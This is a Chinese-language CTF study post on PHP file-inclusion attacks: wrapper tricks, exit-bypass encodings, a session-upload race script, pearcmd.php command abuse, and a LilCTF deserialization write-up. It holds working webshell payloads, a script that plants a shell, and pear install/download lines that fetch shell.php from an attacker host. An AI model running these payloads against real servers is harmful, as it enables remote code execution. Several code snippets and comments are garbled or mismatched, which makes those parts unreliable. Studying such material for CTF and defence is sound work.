---
title: 文件包含与 PHP 伪协议
date: 2026-11-22 08:03:00
author: Xendr1a
categories: [Web安全, Web基础]
tags: [文件包含, PHP伪协议, LFI]
description: 文件包含的判断、php://filter 等伪协议、临时文件包含、pearcmd 利用与死亡绕过。
toc: true
---

按「能不能包含 → 包含什么 → 怎么读源码 → 怎么 getshell」组织：伪协议、临时文件、pearcmd、日志包含与 exit 死亡绕过。

## 文件包含基础

常见的导致文件包含的函数有：

- PHP：`include()`，`include_once()`，`require()`，`require_once()`，`fopen()`，`readfile()` 等
- JSP Servlet：`ava.io.File()`，`java.io.FileReader()` 等
- ASP：`includefile`，`includevirtual` 等

## php伪协议

PHP伪协议（PHP Wrappers）是一种PHP提供的特殊协议或方案，允许程序通过不同的“协议”或“方案”来访问不同类型的数据资源。这些伪协议通常在文件操作或流处理时使用，可以用于访问远程文件、数据或本地文件，甚至是某些PHP函数内部的特定处理。PHP伪协议可以让你通过特定的URL结构或数据流方式与文件进行交互。

简单理解就是通过不同的前缀来让php执行不同方式的代码

![image-20250527192922-u3xl7uf](/img/web-file-inclusion/img-01.png)

### 常见类型

```text
file:// — 通过URL访问本地文件系统

http:// — 访问 HTTP(s) 网址，读取远程网站的数据

https:// — 访问 HTTP(s) 网址，读取远程网站的数据

ftp:// — 访问 FTP(s) URLs ，通过FTP协议与远程服务器进行交互，读取或者上传文件

php:// — 访问各个输入/输出流（I/O streams）

zip:// — 压缩流 ，用于处理zip文件中的文件，支持读取解压修改文件

data:// — 数据（RFC 2397），允许数据以URL的编码的方式嵌入到请求中。它可以在不涉及文件系统的情况下处理数据

glob:// — 查找匹配的文件路径模式

phar:// — PHP 归档 ，将多个PHP文件打包成一个文件的格式，类似于 tar，zip，可以用来访问php归档文件中的文件和资源

ssh2:// — Secure Shell 2

rar:// — RAR

ogg:// — 音频流

expect:// — 处理交互式的流
```

## data:／／ 伪协议

data:// 伪协议是 PHP 中的一种特殊协议，允许在不依赖外部文件的情况下，直接将数据嵌入到 PHP 代码中进行处理。data:// 协议常用于嵌入小型的数据内容（如文本或图像），它通过在 URL 中直接包含数据的方式，简化了文件操作的需求，尤其适用于在 Web 应用中处理嵌入式资源时的场景

### 基本语法

```text
data://[MIME-type];base64,[data]
data://：协议标识符，表示这是一个 data 协议。
MIME-type：可选的 MIME 类型，指定数据的格式。例如：text/plain、image/png 等。
base64：如果数据是二进制数据（如图片或其他文件），则通常采用 Base64 编码。这个标识符表示数据部分是经过 Base64 编码的。
[data]：要嵌入的数据部分。如果数据是文本，可以直接使用；如果是二进制数据，通常需要进行 Base64 编码。
```

### 直接介绍用法

```text
1、data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>

2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

## exit死亡绕过

主要原理：将死亡部分的代码解析成php无法识别的代码

### 第一种

```text
file_put_contents($filename , "<?php exit();".$content);
```

filename控制文件名，content则控制文件内容

#### 方法1：base64

当使用php://filter伪协议，会按照设置的解码方式将content进行解码之后再写入协议内，所以就有

```text
filename=php://filter/convert.base64-decode/resource=a.php
content=aPD9waHAgcGhwaW5mbygpOz8+ 
//这个是<?=@eval($_POST[a]);?>的base64编码之后
```

#### 方法2：ROT13编码

当使用php://filter伪协议，会按照设置的解码方式将content进行解码之后再写入协议内

```text
filename=php://filter/string.rot13/resource=a.php
content=<?=@riny($_CBFG[n]);?>
//这个是<?=@eval($_POST[a]);?>的rot13编码
```

#### 方法3：.htaccess的预包含处理

## file:／／

**用于访问本地文件系统**，并且不受allow_url_fopen，allow_url_include影响  
**file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)**

### 基本格式

```text
file://[hostname]/path/to/file

file://是协议头，表示file协议
[hostname]表示要访问的主机，通常为空（省略）或者localhost表示本地的文件系统。但是如果需要访问远程主机的文件系统，则需要指定主机名
/path/to/file表示文件的绝对路径或者相对路径
```

### 然后补充

```text
文件包含漏洞：file://协议可以直接访问服务器的文件系统，当下恒旭没有进行严格过滤的时候，既可以利用这个协议访问文件

目录穿越漏洞：当可以输入类似 ../../ 的路径，结合 file:// 协议，可以进行一些文件的读取

与其他协议相结合如file://php://filter/read=convert.base64-encode/resource=flag，这条指令会使用php的过滤器功能，将flag文件内容以base64编码形式读取
```

## glob:／／

glob:// — 查找匹配的文件路径模式

```text
示例 #1 基本用法

<?php
// 循环 ext/spl/examples/ 目录里所有 *.php 文件
// 并打印文件名和文件尺寸
$it = new DirectoryIterator("glob://ext/spl/examples/*.php");
foreach($it as $f) {
    printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
}
?>
tree.php: 1.0K
findregex.php: 0.6K
findfile.php: 0.7K
dba_dump.php: 0.9K
nocvsdir.php: 1.1K
phar_from_dir.php: 1.0K
ini_groups.php: 0.9K
directorytree.php: 0.9K
dba_array.php: 1.1K
class_tree.php: 1.8K
```

## php:／／filter

php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用**，类似 readfile()、 file() 和** file_get_contens**()，** 在数据流内容读取之前没有机会应用其他过滤器。  
简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。

**php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。**

```text
file的参数
resource=<要过滤的数据流>	    这个参数是必须的。它指定了你要筛选过滤的数据流。
read=<读链的筛选列表>	        该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
write=<写链的筛选列表>	    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
<；两个链的筛选列表>	      任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。
```

**payload**

```text
常用
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
```

### 常见过滤器

1. 字符串过滤器(String Filters)

   - string.rot13  
string.rot13对字符串进行ROT13编码或者解码，ROT13是一种简单的加密方法，通过将字母表中的字母轮换十三个位置进行加密数据，（字母表有二十六个字母，进行两次ROT13编码的内容会恢复原样）  
举例`php://filter/read=string.rot13/resource=flag.php`(**注**：这里read=可以不写，不写默认是只读，写的话就说明只能是可读方式)  
php://filter是php的流过滤器协议  
read=string.rot13表示对文件内容进行ROT13编码  
resource=flag是要读取的文件
   - string.toupper  
string.toupper将文件内容转换为大写  
举例`php://filter/read=string.toupper/resource=flag.php`
   - string.tolower  
string.tolower将文件内容转换为小写，不会影响非字母字符  
举例`php//filter/read=string.tolower/resource=flag.php`
   - string.strip_tags  
string.strip_tags主要作用是去除字符中的html和php标签，常常用于从用户输入或网页内容中去除潜在的恶意代码，以增强安全性，尤其是在处理不可信的用户输入时（通常用于防止xss）  
举例`php://filter/read=string.strip_tags/resource=flag`
2. 转换过滤器(Conversion Filters)

   - convert.base64-encode  
convert.base64-encode将文件内容进行base64编码  
举例`php://filter/convert.base64-encode/resource=flag.php`
   - convert.base64-decode  
convert.base64-encode将文件内容进行base64解码  
举例`php://filter/convert.base64-decode/resource=flag.php`
   - convert.quoted-printable-encode  
convert.quoted-printable-encode就在文件内容末尾加了个=0A  
举例`php://filter/convert.quoted-printable-encode/resource=flag.php`
   - convert.quoted-printable-decode  
convert.quoted-printable-decode就在文件内容末尾将之前加密的=0A去掉  
举例`php://filter/convert.quoted-printable-decode/resource=flag.php`
3. 压缩过滤器

   - zlib.deflate  
zlib.deflate过滤器将流数据（例如文件、网络请求体等）使用 Deflate 算法进行压缩。  
举例`php://filter/zlib.deflate/resource=flag.php`
   - zlib.inflate  
zlib.inflate将输入数据流中的压缩内容解压，恢复成原始数据。  
举例`php://filter/zlib.deflate|zlib.inflate/resource=flag.php`（压缩之后再解压）
4. 加密过滤器

## php:／／input（输入流

php://input 是个可以访问请求的原始数据的只读流，获取POST请求数据的协议

特点

```text
原始数据访问：
允许开发者直接获取未经解析的原始HTTP请求体
数据不会经过PHP的psot和get的自动处理

只读流：
只能用来读取数据，不能用来进行写操作
数据只能读一次

支持的请求方法：
主要用于post，put，patch和其他带有请求体的http方法
对于get和其他无请求体的方法，会返回空字符
```

### 常常与post配合

当传进去的参数作为文件名变量去打开文件时，可以将参数file传参为php://input，同时post方式传进去值作为文件内容，供php代码执行时当做文件内容读取。

```text
http：//127.0.0.1/?file=php://input
POST:<?system("ls");?>
```

## php:／／output（输出流

`php://output` 是一个写入流，允许你将数据直接写入到 PHP 的输出缓冲区。这意味着你可以将内容写入 HTTP 响应，而不需要直接使用 `echo` 或 `print`。

## php:／／stdin（输入流

允许 PHP 从标准输入流读取数据，类似于 Unix 系统中的输入流。标准输入通常指的是用户在控制台中键入的内容。在命令行模式下，使用 php://stdin 可以读取用户的输入。在 Web 环境中，，但它仍然可以通过一些特殊手段绕过常规的输入方式。

工作原理：php://stdin 作为流式协议，允许 PHP 直接读取命令行或脚本的输入。它类似于 php://input，但 php://input 用于读取 HTTP 请求体，而 php://stdin 读取的是标准输入流中的数据。

## 临时文件包含

当 PHP 开启了：

- **session.upload_progress**
- **session.auto_start 或者访问首页生成 Session**

PHP 在**上传文件**时，会自动写入一个**临时 session 文件**：

```text
/tmp/sess_<sessionid>
```

并且其中包含：

```text
upload_progress_<form field name> = $_POST['PHP_SESSION_UPLOAD_PROGRESS']
```

如果你把**恶意代码**写入这个字段，那么 session 文件中就会出现你的 payload。

📌 **如果页面有 session 包含漏洞（例如可以 include 任意文件 → ?path=xx），就可以包含 /tmp/sess_xxx，从而执行 PHP 代码 getshell。**

例题ctfshow __web安全应用与防护  临时文件包含

```text
解
import requests
import threading

session = requests.session()
sess = 'ctfshow'
url = "http://8a2e1e6c-5edc-4e98-b3a2-1905bdf1f629.challenge.ctf.show/"

data1 = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php echo "success";file_put_contents("/var/www/html/1.php","<?php eval(\\$_POST[1]);?>");?>'
}
file = {
    'file': 'ctfshow'  //上传文件
}
cookies = {
    'PHPSESSID': sess  //固定防止变化
}

def write():
    while True:
        r = session.post(url, data=data1, files=file, cookies=cookies)

def read():
    while True:
        r = session.get(url + "?path=/tmp/sess_ctfshow", cookies=cookies)
        if 'success' in r.text:
            print("shell 地址为：" + url + "1.php")
            exit()

threads = [threading.Thread(target=write),
           threading.Thread(target=read)]
for t in threads:
    t.start()
```

## 关于pearcmd.php的利用

复现lilctf时遇到了，突然发现自己缺了这块的知识，所以写了这篇

#### PECL

PECL 的全称是 The PHP Extension Community Library ，是一个开放的并通过 PEAR(PHP Extension and Application Repository，PHP 扩展和应用仓库)打包格式来打包安装的 PHP 扩展库仓库，**在docker中默认安装，路径为/user/local/lib/php.**

#### register_argc_argv

register_argc_argv=On

当该选项开启时（Docker 的 PHP 镜像中默认为 On），PHP 会将 HTTP 请求中的 URL 问号后面的内容注册为全局变量 \$argc（参数个数）和 \$argv（参数数组）。

我们可以测试一下

```text
<pre>
<?php
echo "register_argc_argv: " . ini_get('register_argc_argv') . "\n";

echo "GET\n";
if (!empty($_GET)) {
    print_r($_GET);
} else {
    echo "无 GET 参数\n";
}

echo "Argv\n";
if (isset($_SERVER['argv'])) {
    print_r($_SERVER['argc']);
    print_r($_SERVER['argv']);
} else {
    echo "未找到\n";
}
?>
</pre>
```

![64654e73-159f-4cd3-be91-13eb474a5e3d-20251124225232-u5jbe9o](/img/web-file-inclusion/img-02.png)

发现一个有趣的好像只有+号能分割参数

#### 利用

当我们文件包含`pearcmd.php`时，`pearcmd.php`会读取register_argc_argv开启时的全局变量`$_SERVER['argv']`，变成其的命令参数，然后执行pear命令

pear参数挺多的

```text
Commands:
build                  Build an Extension From C Source
bundle                 Unpacks a Pecl Package
channel-add            Add a Channel
channel-alias          Specify an alias to a channel name
channel-delete         Remove a Channel From the List
channel-discover       Initialize a Channel from its server
channel-info           Retrieve Information on a Channel
channel-login          Connects and authenticates to remote channel server
channel-logout         Logs out from the remote channel server
channel-update         Update an Existing Channel
clear-cache            Clear Web Services Cache
config-create          Create a Default configuration file
config-get             Show One Setting
config-help            Show Information About Setting
config-set             Change Setting
config-show            Show All Settings
convert                Convert a package.xml 1.0 to package.xml 2.0 format
cvsdiff                Run a "cvs diff" for all files in a package
cvstag                 Set CVS Release Tag
download               Download Package
download-all           Downloads each available package from the default channel
info                   Display information about a package
install                Install Package
list                   List Installed Packages In The Default Channel
list-all               List All Packages
list-channels          List Available Channels
list-files             List Files In Installed Package
list-upgrades          List Available Upgrades
login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]
logout                 Logs out from the remote server [Deprecated in favor of channel-logout]
makerpm                Builds an RPM spec file from a PEAR package
package                Build Package
package-dependencies   Show package dependencies
package-validate       Validate Package Consistency
pickle                 Build PECL Package
remote-info            Information About Remote Packages
remote-list            List Remote Packages
run-scripts            Run Post-Install Scripts bundled with a package
run-tests              Run Regression Tests
search                 Search remote package database
shell-test             Shell Script Test
sign                   Sign a package distribution file
svntag                 Set SVN Release Tag
uninstall              Un-install Package
update-channels        Update the Channel List
upgrade                Upgrade Package
upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]
```

###### 1.config-create

这个方法有两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中

```text
pear config-create <root_path> <file_path>
```

```text
?+config-creater+/usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1]);?>+/var/www/html/hello.php
```

或者

```text
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/test.php 
```

###### 2.利用 install或者download远程下载

###### install

```text
pear install http://[vps]:[port]/test1.php
```

利用

```text
?+install+--installroot+&file=/usr/local/lib/php/pearcmd.php&+http://[vps]:[port]/shell.php
或者
/?file=/usr/local/lib/php/peclcmd.php&+install+http://vps/shell.php
```

###### download

```text
pear download [option] [package]
```

利用

```text
?+download+file=/usr/local/lib/php/pearcmd.php&+http://[vps]:[port]/test1.php&
或者
/?file=/usr/local/lib/php/peclcmd.php&+download+http://vps/1.php
```

##### 当pearcmd关键词被ban，可以用peclcmd.php作为平替

#### 例题的话LilCTF2025（Your Uns3r）

```text
<?php
highlight_file(__FILE__);
class User
{
    public $username;
    public $value;
    public function exec()
    {
        if (strpos($this->value, 'S:') === false) {
            $ser = serialize(unserialize($this->value));
            $instance = unserialize($ser);
            if ($ser != $this->value && $instance instanceof Access) {
                include($instance->getToken());
            }
        } else {
            throw new Exception("wanna ?");
        }
    }
    public function __destruct()
    {
        if ($this->username == "admin") {
            $this->exec();
        }
    }
}

class Access
{
    protected $prefix;
    protected $suffix;

    public function getToken()
    {
        if (!is_string($this->prefix) || !is_string($this->suffix)) {
            throw new Exception("Go to HELL!");
        }
        $result = $this->prefix . 'lilctf' . $this->suffix;
        if (strpos($result, 'pearcmd') !== false) {
            throw new Exception("Can I have peachcmd?");
        }
        return $result;

    }
}

$ser = $_POST["user"];
if (stripos($ser, 'admin') !** false || stripos($ser, 'Access":') !** false) {
    exit ("no way!!!!");
}

$user = unserialize($ser);
throw new Exception("nonono!!!");
Fatal error: Uncaught exception 'Exception' with message 'nonono!!!' in /var/www/html/index.php:52 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 52
```

很明显我们的目标在

```text
include($instance->getToken());
```

我们先一层一层来，首先看到

```text
$ser = $_POST["user"];
if (stripos($ser, 'admin') !** false || stripos($ser, 'Access":') !** false) {
    exit ("no way!!!!");
}
```

这里`admin`我们能用S:+16进制来绕过，`Access":`我们可以用php类名大小写不敏感来绕过

然后我们看到了

```text
 public function exec()
    {
        if (strpos($this->value, 'S:') === false) {
            $ser = serialize(unserialize($this->value));
            $instance = unserialize($ser);
            if ($ser != $this->value && $instance instanceof Access) {
                include($instance->getToken());
            }
        } else {
            throw new Exception("wanna ?");
        }
    }
```

前面不能有Access现在又要有，那我们可以利用不完整类来让作为 `__PHP_Incomplete_Class_Name` 的成员变为类名，然后二次反序列化后消除，得到Access

```text
$result = $this->prefix . 'lilctf' . $this->suffix . '.php';
```

路径的话拼接/../t跳跃就行，由于最后面固定了后缀为`.php`，我们可以使用pearcmd，但是

```text
if (strpos($result, 'pearcmd') !== false) {
            throw new Exception("Can I have peachcmd?");}
```

那我们可以用`peclcmd.php`平替，直接开写

```text
<?php

class Access
{
    protected $prefix = '/usr/local/lib/';
    protected $suffix = '/../php/peclcmd.php';

    public function getToken()
    {
        if (!is_string($this->prefix) || !is_string($this->suffix)) {
            throw new Exception("Go to HELL!");
        }
        $result = $this->prefix . 'lilctf' . $this->suffix;
        if (strpos($result, 'pearcmd') !== false) {
            throw new Exception("Can I have peachcmd?");
        }
        return $result;
    }
}

class User
{
    public $username;
    public $value;
    public function exec()
    {
        $ser = unserialize(serialize(unserialize($this->value)));
        if ($ser != $this->value && $ser instanceof Access) {
        }
    }
    public function __destruct()
    {
        if ($this->username == "admin") {
            $this->exec();
        }
    }
}

$a = new User();
$b = new Access();
$a->username = 'admin';
$c = serialize($b);
$c = str_replace('Access":2', '114514":3', $c);
$c = substr($c, 0, -1);
$c .= 's:27:"__PHP_Incomplete_Class_Name";s:6:"Access";}';
$a->value = $c;
$a1 = serialize($a);
$a1 = str_replace(';s:5:"admin"', ';S:5:"\61\64\6d\69\6e"', $a1);
$a1 = substr($a1, 0, -1);//触发__destruct，跳过throw new Exception("nonono!!!");
echo urlencode($a1) . "\n";
```

然后就是发送了，我们构造pear命令

```text
POST /index.php?+config-create+/<?=eval($_POST[cmd])?>+/var/www/html/index.php HTTP/1.1

user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22%5C61dmin%22%3Bs%3A5%3A%22value%22%3Bs%3A147%3A%22O%3A6%3A%22LilRan%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A15%3A%22%2Fusr%2Flocal%2Flib%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A19%3A%22%2F..%2Fphp%2Fpeclcmd.php%22%3Bs%3A27%3A%22__PHP_Incomplete_Class_Name%22%3Bs%3A6%3A%22Access%22%3B%7D%22%3B&cmd=system('/readflag');
```

### 总结

闲来无事突然想起来lilctf没有复现，突然发现这题Your Uns3r还挺有意思的，然后了解到了pearcmd.php，花了好些时间来学习，但不知道为什么复现提交完flag后再回来就复现不了了，也发现了自己挺多的小毛病，这里贴上官方wp地址[https://lil-house.feishu.cn/wiki/N7EIwqpoEiVngqkV8rzcgPB9nPg](https://lil-house.feishu.cn/wiki/N7EIwqpoEiVngqkV8rzcgPB9nPg)，还得继续好好学习，天天向上。

## PHP伪协议

（一般出现文件包含函数就应该想到伪协议）ctf 中伪协议常用 php://filter、php://input

1、File://          -- 访问本地文件系统   **示例**：`file:///path/to/file.txt` 用于访问本地文件  
2、http://          --访问http(s)网址   **示例**：`http://example.com` 用于访问网络上的资源。  
3、Phar://           --PHP归档   **示例**：`phar:///path/to/file.phar/file.php` 用于访问PHAR归档中的文件

row

4、Php://          --访问各个输入/输出流

**用途**：这是一个特殊的伪协议，用于访问各种输入/输出流。

`php://input` 用于读取原始 POST 数据。

`php://output` 用于写入到输出缓冲区。

`php://memory` 和 `php://temp` 用于临时数据存储。

row

`php://filter/过滤器|过滤器/resource=要过滤的数据流` 列如：

###### convert.base64-encode

###### convert.base64-decode

###### convert.quoted-printable-encode

###### convert.quoted-printable-decode

###### convert.iconv.*等等

col

row

5、Zlib://          --压缩流

**用途**：用于访问ZIP压缩文件中的文件。

**示例**：`zip:///path/to/file.zip#innerfile.txt` 用于访问ZIP文件中的特定文件。

6、Data://          --数据   **示例**：`data://text/plain;base64,SGVsbG8gV29ybGQ=` 用于解码Base64编码的数据  
7、Glob://           --查找匹配的文件路径模式  
8、ftp://           --访问ftp(s)URLs  
9、ssh2://         --Secure Shell 2  
10、rar://         --RAR  
11、ogg://         --音频流  
12、expect://         --处理交互式的流

13、`compress.zlib://flag.php`

- **压缩/解压流**：`compress.zlib://` 用于读取或写入经过 zlib 压缩的数据。若文件已被压缩（如使用 `gzcompress()`），该协议会自动解压内容；若写入，则自动压缩数据。

![image-20250527192922-u3xl7uf](/img/web-file-inclusion/img-01.png)
